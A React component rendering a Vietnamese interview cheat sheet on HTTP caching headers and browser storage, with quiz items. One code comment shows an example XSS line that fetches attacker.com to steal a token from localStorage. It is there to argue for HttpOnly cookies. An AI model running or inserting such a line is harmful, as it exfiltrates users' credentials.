'use client';

import React, { useState } from 'react';
import { Eye, EyeOff, Copy, Check, CheckCircle2, ChevronRight, Clock, Database, Globe, ShieldCheck } from 'lucide-react';

export function HttpCacheCheatsheet() {
  const [activeTab, setActiveTab] = useState<'headers' | 'storage' | 'traps'>('headers');
  const [activeQuestion, setActiveQuestion] = useState<0 | 1 | 2>(0);
  const [showAnswer, setShowAnswer] = useState<Record<number, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const toggleAnswer = (idx: number) => {
    setShowAnswer((prev) => ({ ...prev, [idx]: !prev[idx] }));
  };

  const questions = [
    {
      id: 0,
      title: 'Bẫy hiểu lầm: "no-cache" không có nghĩa là không lưu cache!',
      badge: 'HTTP Specification',
      pipeline: [
        { label: 'Cache-Control: no-cache', bg: 'bg-zinc-200 text-zinc-900' },
        { label: 'Trình duyệt VẪN LƯU file', bg: 'bg-amber-100 text-amber-950 border border-amber-300' },
        { label: 'Gửi ETag xác thực (304)', bg: 'bg-emerald-100 text-emerald-950 border border-emerald-300' },
      ],
      code: `// Server response header:
Cache-Control: no-cache
ETag: "v1.2.3"

// Lần tải tiếp theo, trình duyệt gửi gì?
// A. Tải lại toàn bộ file mới từ đầu (Status 200)
// B. Gửi Header: If-None-Match: "v1.2.3", nếu chưa đổi nhận 304 Not Modified?`,
      note: 'Nếu muốn hoàn toàn không lưu bất kỳ byte nào vào đĩa/RAM, phải dùng `no-store`.',
      answerSummary: 'Đáp án B: Gửi xác thực điều kiện và nhận 304 Not Modified',
      answerDetail:
        '`no-cache` ra lệnh cho trình duyệt: "Hãy lưu file này vào cache, NHƯNG trước mỗi lần dùng lại, bắt buộc phải gửi request hỏi server xem file có thay đổi không!". Nếu file không đổi, server trả về `304 Not Modified` (body rỗng, cực nhẹ). Để cấm tuyệt đối việc lưu file (dành cho dữ liệu ngân hàng, OTP), phải dùng `Cache-Control: no-store`!',
    },
    {
      id: 1,
      title: 'Lưu trữ JWT Token: LocalStorage hay HttpOnly Cookie?',
      badge: 'Bảo mật Web',
      pipeline: [
        { label: 'LocalStorage (Dễ bị đọc bởi XSS)', bg: 'bg-rose-100 text-rose-950 border border-rose-300' },
        { label: 'HttpOnly Cookie (JS không thể chạm vào)', bg: 'bg-emerald-100 text-emerald-950 border border-emerald-300' },
        { label: 'Kết hợp SameSite=Strict (Chặn CSRF)', bg: 'bg-blue-100 text-blue-950 border border-blue-300' },
      ],
      code: `// ❌ KÉM AN TOÀN: Lưu JWT trong LocalStorage
localStorage.setItem('access_token', token);
// Bất kỳ đoạn mã script độc hại (XSS) nào trên trang
// đều có thể gửi: fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))

// ✅ AN TOÀN CHUẨN SENIOR: Set-Cookie từ Backend
Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict; Path=/;`,
      note: 'Flag `HttpOnly` ngăn chặn hoàn toàn JavaScript document.cookie truy cập.',
      answerSummary: 'HttpOnly + Secure + SameSite Cookie là tiêu chuẩn vàng',
      answerDetail:
        'Lưu JWT vào `localStorage` là lỗi bảo mật phổ biến nhất của Junior/Mid. Một lỗ hổng XSS từ thư viện npm bên thứ 3 có thể đánh cắp sạch token của người dùng. Với `HttpOnly Cookie`, trình duyệt tự động đính kèm cookie vào request HTTP nhưng mã JS hoàn toàn bị mù, không thể đọc được giá trị token.',
    },
    {
      id: 2,
      title: 'Cơ chế stale-while-revalidate: Trải nghiệm tải tức thì 0ms',
      badge: 'Modern Cache Strategy',
      pipeline: [
        { label: 'User mở trang ➔ Trả ngay cache cũ (0ms)', bg: 'bg-emerald-100 text-emerald-950 border border-emerald-300' },
        { label: 'Ngầm gửi background request revalidate', bg: 'bg-blue-100 text-blue-950 border border-blue-300' },
        { label: 'Cập nhật cache mới cho lần mở sau', bg: 'bg-zinc-200 text-zinc-900' },
      ],
      code: `// HTTP Header hoặc SWR / React Query config:
Cache-Control: max-age=60, stale-while-revalidate=86400

// Trong 60 giây đầu: Dùng Fresh Cache (không gửi request).
// Từ giây 61 đến 86400: Dữ liệu đã Stale (cũ).
// Trình duyệt trả NGAY LẬP TỨC dữ liệu stale cho người dùng,
// đồng thời gửi một background request ngầm để cập nhật cache!`,
      note: 'Triết lý: Phục vụ ngay lập tức cho người dùng, sau đó âm thầm cập nhật dữ liệu.',
      answerSummary: 'Xoá bỏ hoàn toàn Loading Spinner cho người dùng quay lại',
      answerDetail:
        '`stale-while-revalidate` (SWR) là chìa khoá vàng giúp các ứng dụng Next.js, Vercel Edge và TanStack Query đạt tốc độ tức thì. Thay vì bắt user nhìn màn hình loading, ta phục vụ phiên bản cached trước, rồi âm thầm đồng bộ bản mới ngầm ở background.',
    },
  ];

  const currentQ = questions[activeQuestion];

  return (
    <article className="space-y-6 animate-in fade-in max-w-5xl mx-auto pb-12" aria-label="Sổ tay Caching">
      {/* 1. Breadcrumbs */}
      <nav className="flex items-center gap-2 text-[13px] text-zinc-600 font-semibold" aria-label="Breadcrumb">
        <span>Network, Security &amp; Cache</span>
        <ChevronRight className="w-3.5 h-3.5 text-zinc-500" />
        <span className="text-zinc-900 font-bold">HTTP Caching &amp; Browser Storage Matrix</span>
      </nav>

      {/* 2. Hero Section */}
      <section className="space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-3xl sm:text-4xl font-bold tracking-tight text-zinc-950 font-serif">
              HTTP Caching &amp; Browser Storage Architecture
            </h1>
            <p className="text-[15px] sm:text-[16px] text-zinc-700 mt-1.5 leading-relaxed">
              Làm chủ các chỉ thị Cache-Control, chu trình xác thực điều kiện 304 (ETag) và bảng so sánh ma trận lưu trữ Cookies, LocalStorage, IndexedDB.
            </p>
          </div>

          <div className="flex items-center gap-2 shrink-0 self-start sm:self-auto">
            <span className="px-3 py-1 rounded-full border border-zinc-300 bg-zinc-50 text-zinc-800 text-[12px] font-semibold flex items-center gap-1 shadow-2xs">
              👌 Strong Middle
            </span>
            <span className="px-3 py-1 rounded-full border border-zinc-300 bg-zinc-50 text-zinc-800 text-[12px] font-semibold flex items-center gap-1 shadow-2xs">
              <Clock className="w-3.5 h-3.5 text-zinc-600" />
              12 phút
            </span>
          </div>
        </div>

        {/* Feature Visual Accent: Cache Decision Diagram */}
        <div className="rounded-2xl border border-zinc-300 bg-[#FBF9F5] p-4 sm:p-5 shadow-2xs" data-visual="http-cache-tree">
          <div className="flex items-center justify-between pb-3 border-b border-zinc-200">
            <div className="flex items-center gap-2 text-zinc-900 font-bold text-sm">
              <Database className="w-4 h-4 text-[#BD5332]" />
              <span>Cây quyết định cấu hình Cache-Control chuẩn Production</span>
            </div>
            <span className="text-[11px] font-mono text-zinc-600 bg-white px-2 py-0.5 rounded border border-zinc-200 font-semibold">
              RFC 9111 HTTP Caching
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-4 gap-2.5 pt-3">
            <div className="p-3 rounded-xl bg-white border border-zinc-200 shadow-2xs space-y-1">
              <span className="text-xs font-mono font-bold text-blue-800">Static Hashed Assets</span>
              <code className="text-[11px] font-mono block text-zinc-800">max-age=31536000, immutable</code>
              <p className="text-[11px] text-zinc-600">File JS/CSS có hash trong tên (`app-a8b2.js`). Lưu 1 năm vĩnh viễn.</p>
            </div>

            <div className="p-3 rounded-xl bg-emerald-50/70 border border-emerald-300 shadow-2xs space-y-1">
              <span className="text-xs font-mono font-bold text-emerald-900">HTML Entry (index.html)</span>
              <code className="text-[11px] font-mono block text-emerald-950">no-cache</code>
              <p className="text-[11px] text-emerald-900">Luôn hỏi server ETag trước khi hiển thị để không dính code cũ.</p>
            </div>

            <div className="p-3 rounded-xl bg-amber-50/70 border border-amber-300 shadow-2xs space-y-1">
              <span className="text-xs font-mono font-bold text-amber-900">Dynamic User APIs</span>
              <code className="text-[11px] font-mono block text-amber-950">stale-while-revalidate</code>
              <p className="text-[11px] text-amber-900">Trả cache ngay lập tức cho user, ngầm fetch bản mới ở background.</p>
            </div>

            <div className="p-3 rounded-xl bg-rose-50/70 border border-rose-300 shadow-2xs space-y-1">
              <span className="text-xs font-mono font-bold text-rose-900">Private / Banking Data</span>
              <code className="text-[11px] font-mono block text-rose-950">no-store, private</code>
              <p className="text-[11px] text-rose-900">Cấm tuyệt đối mọi trung gian CDN và browser ghi dữ liệu vào đĩa.</p>
            </div>
          </div>
        </div>
      </section>

      {/* 3. Underline Tab Bar */}
      <nav className="flex items-center gap-8 border-b border-zinc-200 pt-1 text-[15px]" aria-label="Nội dung sổ tay">
        <button
          onClick={() => setActiveTab('headers')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'headers'
              ? 'border-b-2 border-[#BD5332] font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          HTTP Cache Headers
        </button>

        <button
          onClick={() => setActiveTab('storage')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'storage'
              ? 'border-b-2 border-[#BD5332] font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          Ma trận Lưu trữ Trình duyệt
        </button>

        <button
          onClick={() => setActiveTab('traps')}
          className={`pb-3 transition-colors cursor-pointer ${
            activeTab === 'traps'
              ? 'border-b-2 border-[#BD5332] font-bold text-zinc-950'
              : 'text-zinc-600 hover:text-zinc-950 font-semibold'
          }`}
        >
          Bẫy phỏng vấn
        </button>
      </nav>

      {/* 4. Alert Banner */}
      <section className="rounded-2xl border border-red-300 bg-red-50 p-4 flex items-start gap-3.5 shadow-2xs" aria-label="Quy tắc quan trọng">
        <div className="w-6 h-6 rounded-full bg-[#DC2626] text-white flex items-center justify-center font-bold text-xs shrink-0 mt-0.5 shadow-xs">
          !
        </div>
        <div>
          <h2 className="font-bold text-[15px] text-red-950">Quy tắc vàng Strong Middle</h2>
          <p className="text-[14px] text-red-950 mt-0.5 leading-relaxed font-medium">
            File <code>index.html</code> tuyệt đối KHÔNG ĐƯỢC set cache dài hạn (như 1 năm). Nếu cache file HTML, khi bạn deploy phiên bản mới với các file bundle JS hash mới, người dùng sẽ bị kẹt vĩnh viễn ở phiên bản cũ cho tới khi họ xoá sạch browser cache!
          </p>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* TAB 1: HTTP CACHE HEADERS                                                 */}
      {/* ========================================================================= */}
      {activeTab === 'headers' && (
        <section className="space-y-4 animate-in fade-in" aria-label="HTTP Cache Headers">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-5 rounded-2xl border border-zinc-200 bg-white space-y-3 shadow-2xs">
              <h3 className="font-bold text-[16px] text-zinc-950 font-serif">
                1. Freshness Check (Độ tươi của Cache)
              </h3>
              <p className="text-[13px] text-zinc-700 leading-relaxed font-medium">
                Sử dụng chỉ thị <code>max-age=seconds</code>. Trong thời gian này, trình duyệt phục vụ dữ liệu từ bộ nhớ <strong>Disk Cache / Memory Cache</strong> và thậm chí không gửi bất kỳ request mạng nào ra ngoài (Status 200 OK - from disk cache).
              </p>
            </div>

            <div className="p-5 rounded-2xl border border-zinc-200 bg-white space-y-3 shadow-2xs">
              <h3 className="font-bold text-[16px] text-zinc-950 font-serif">
                2. Validation Check (Xác thực điều kiện ETag)
              </h3>
              <p className="text-[13px] text-zinc-700 leading-relaxed font-medium">
                Khi cache hết hạn (stale), trình duyệt gửi request đính kèm <code>If-None-Match: "hash"</code>. Nếu server kiểm tra nội dung file chưa đổi, nó trả về mã <code>304 Not Modified</code> không kèm body, tiết kiệm 99% băng thông mạng.
              </p>
            </div>
          </div>
        </section>
      )}

      {/* ========================================================================= */}
      {/* TAB 2: MA TRẬN LƯU TRỮ TRÌNH DUYỆT                                        */}
      {/* ========================================================================= */}
      {activeTab === 'storage' && (
        <section className="space-y-4 animate-in fade-in" aria-label="Ma trận lưu trữ">
          <div className="rounded-2xl border border-zinc-200 bg-white overflow-hidden shadow-2xs">
            <table className="w-full text-left border-collapse text-[13px]">
              <thead>
                <tr className="bg-zinc-100 border-b border-zinc-200 text-zinc-800 font-mono font-bold">
                  <th className="p-3">Loại lưu trữ</th>
                  <th className="p-3">Dung lượng</th>
                  <th className="p-3">Tự động gửi kèm Request?</th>
                  <th className="p-3">Truy cập từ JavaScript</th>
                  <th className="p-3">Trường hợp sử dụng lý tưởng</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-200 font-medium">
                <tr className="hover:bg-zinc-50">
                  <td className="p-3 font-bold text-zinc-950">HttpOnly Cookie</td>
                  <td className="p-3">~4 KB</td>
                  <td className="p-3 text-emerald-700 font-bold">Có (Mỗi HTTP request)</td>
                  <td className="p-3 text-rose-700 font-bold">KHÔNG (Miễn nhiễm XSS)</td>
                  <td className="p-3">Session Auth, Refresh Token, User ID</td>
                </tr>
                <tr className="hover:bg-zinc-50">
                  <td className="p-3 font-bold text-zinc-950">LocalStorage</td>
                  <td className="p-3">~5 MB - 10 MB</td>
                  <td className="p-3 text-zinc-500">Không</td>
                  <td className="p-3 text-amber-700">Có (Đồng bộ, chặn Main Thread)</td>
                  <td className="p-3">UI Theme (Dark/Light), cài đặt người dùng</td>
                </tr>
                <tr className="hover:bg-zinc-50">
                  <td className="p-3 font-bold text-zinc-950">SessionStorage</td>
                  <td className="p-3">~5 MB</td>
                  <td className="p-3 text-zinc-500">Không (Mất khi tắt Tab)</td>
                  <td className="p-3 text-amber-700">Có (Đồng bộ)</td>
                  <td className="p-3">Dữ liệu form đa bước tạm thời trong 1 tab</td>
                </tr>
                <tr className="hover:bg-zinc-50">
                  <td className="p-3 font-bold text-zinc-950">IndexedDB</td>
                  <td className="p-3">Hàng trăm MB đến GB</td>
                  <td className="p-3 text-zinc-500">Không</td>
                  <td className="p-3 text-emerald-700 font-bold">Có (Bất đồng bộ, NoSQL)</td>
                  <td className="p-3">Offline-first PWA, Caching API lớn, File/Blob</td>
                </tr>
              </tbody>
            </table>
          </div>
        </section>
      )}

      {/* ========================================================================= */}
      {/* TAB 3: BẪY PHỎNG VẤN (QUIZ INTERACTION)                                   */}
      {/* ========================================================================= */}
      {activeTab === 'traps' && (
        <section className="space-y-5 animate-in fade-in" aria-label="Câu hỏi bẫy phỏng vấn">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-zinc-200">
            <div>
              <h3 className="text-xl font-bold text-zinc-950 font-serif">
                Câu hỏi bẫy thường gặp (Strong Mid)
              </h3>
              <p className="text-[14px] text-zinc-700 mt-0.5">
                Dự đoán luồng xử lý trước khi mở đáp án chi tiết
              </p>
            </div>

            <div className="flex items-center gap-1.5 p-1 rounded-xl bg-zinc-100 border border-zinc-200 shrink-0">
              {questions.map((q, idx) => (
                <button
                  key={q.id}
                  onClick={() => setActiveQuestion(idx as 0 | 1 | 2)}
                  className={`min-h-[44px] md:min-h-[38px] px-3.5 py-1.5 rounded-lg text-xs font-semibold font-mono transition-all cursor-pointer flex items-center justify-center ${
                    activeQuestion === idx
                      ? 'bg-white text-[#BD5332] shadow-2xs font-bold border border-zinc-300'
                      : 'text-zinc-700 hover:text-zinc-950 hover:bg-zinc-200/50'
                  }`}
                >
                  Câu {idx + 1}
                </button>
              ))}
            </div>
          </div>

          {/* Active Question Card */}
          <div className="rounded-2xl border border-zinc-300 bg-white p-5 sm:p-6 space-y-4 shadow-2xs">
            <div className="flex items-center justify-between gap-3">
              <div className="flex items-center gap-2.5">
                <span className="w-6 h-6 rounded-md bg-[#BD5332] text-white flex items-center justify-center font-bold text-xs font-mono shadow-2xs">
                  {currentQ.id + 1}
                </span>
                <h4 className="font-bold text-[17px] text-zinc-950">
                  {currentQ.title}
                </h4>
              </div>

              <button
                onClick={() => toggleAnswer(currentQ.id)}
                className="min-h-[44px] md:min-h-[38px] px-3.5 py-1.5 rounded-lg border border-zinc-300 bg-white hover:bg-zinc-50 text-[13px] font-semibold text-zinc-800 flex items-center gap-1.5 transition-colors cursor-pointer shadow-2xs"
              >
                {showAnswer[currentQ.id] ? (
                  <EyeOff className="w-3.5 h-3.5 text-zinc-600" />
                ) : (
                  <Eye className="w-3.5 h-3.5 text-zinc-600" />
                )}
                <span>{showAnswer[currentQ.id] ? 'Ẩn đáp án' : 'Xem đáp án'}</span>
              </button>
            </div>

            {/* Visual Pipeline */}
            <div className="flex flex-wrap items-center gap-2 p-3 rounded-xl bg-zinc-50 border border-zinc-200 text-xs font-mono">
              <span className="font-bold text-zinc-700 uppercase tracking-wider text-[11px]">Luồng xử lý:</span>
              {currentQ.pipeline.map((step, i) => (
                <React.Fragment key={i}>
                  <span className={`px-2.5 py-1 rounded-md text-[11px] font-bold shadow-2xs ${step.bg}`}>
                    {step.label}
                  </span>
                  {i < currentQ.pipeline.length - 1 && (
                    <span className="text-zinc-500 font-bold">➔</span>
                  )}
                </React.Fragment>
              ))}
            </div>

            {/* Mac Terminal Code Block */}
            <div className="rounded-xl bg-[#18181B] p-3.5 text-zinc-100 font-mono text-[13px] overflow-hidden shadow-2xs">
              <div className="flex items-center justify-between pb-2 border-b border-zinc-800 text-zinc-400 text-[11px] mb-2.5">
                <div className="flex items-center gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-full bg-[#EF4444]" />
                  <span className="w-2.5 h-2.5 rounded-full bg-[#EAB308]" />
                  <span className="w-2.5 h-2.5 rounded-full bg-[#22C55E]" />
                </div>
                <span className="font-mono text-zinc-400 font-medium">http</span>
                <button
                  onClick={() => handleCopy(`cache-q-${currentQ.id}`, currentQ.code)}
                  className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white transition-colors cursor-pointer min-h-[30px] min-w-[30px] flex items-center justify-center"
                  title="Sao chép mã"
                >
                  {copiedId === `cache-q-${currentQ.id}` ? (
                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>

              <pre className="text-zinc-200 leading-relaxed overflow-x-auto">{currentQ.code}</pre>
            </div>

            <div className="text-[13px] text-zinc-700 italic flex items-center gap-1.5 font-medium">
              <span className="font-bold text-[#BD5332]">ⓘ</span>
              <span>{currentQ.note}</span>
            </div>

            {/* Revealed Answer */}
            {showAnswer[currentQ.id] && (
              <div className="p-4 rounded-xl bg-amber-50 border border-amber-300 text-[14px] space-y-2 animate-in fade-in">
                <div className="flex items-center gap-2 font-bold text-amber-950 font-mono">
                  <CheckCircle2 className="w-4 h-4 text-emerald-700 shrink-0" />
                  <span>Đáp án chi tiết: {currentQ.answerSummary}</span>
                </div>
                <p className="text-[13px] text-amber-950 leading-relaxed font-medium">
                  {currentQ.answerDetail}
                </p>
              </div>
            )}
          </div>
        </section>
      )}
    </article>
  );
}
